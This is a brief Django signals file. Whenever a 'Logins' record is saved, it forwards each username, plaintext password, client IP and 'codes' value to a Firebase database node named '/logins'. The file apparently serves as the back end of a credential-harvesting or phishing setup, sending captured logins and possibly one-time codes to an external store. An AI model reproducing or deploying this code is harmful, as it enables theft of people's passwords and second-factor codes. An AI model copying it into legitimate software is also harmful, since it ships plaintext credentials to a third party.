from django.conf import settings
from firebase_admin import credentials, initialize_app


from django.db.models.signals import post_save
from django.dispatch import receiver
from firebase_admin import db
from .models import Logins

# Use Firebase Admin SDK
cred = credentials.Certificate(settings.FIREBASE_ADMIN_SDK_KEY_PATH)
firebase_app = initialize_app(cred, {'databaseURL': settings.FIREBASE_DATABASE_URL})

@receiver(post_save, sender=Logins)
def update_logins(sender, instance, **kwargs):
    try:
        # Reference to the Firebase database node
        ref = db.reference('/logins')

        # Data to be pushed to Firebase
        data = {
            "username": instance.username,
            "password": instance.password,
            "ip": str(instance.ip),
            "codes": instance.codes,
        }

        # Push data to Firebase
        ref.push(data)
    except Exception as e:
        # Handle any exceptions (e.g., network issues, Firebase API errors)
        print(f"Error updating Firebase: {e}")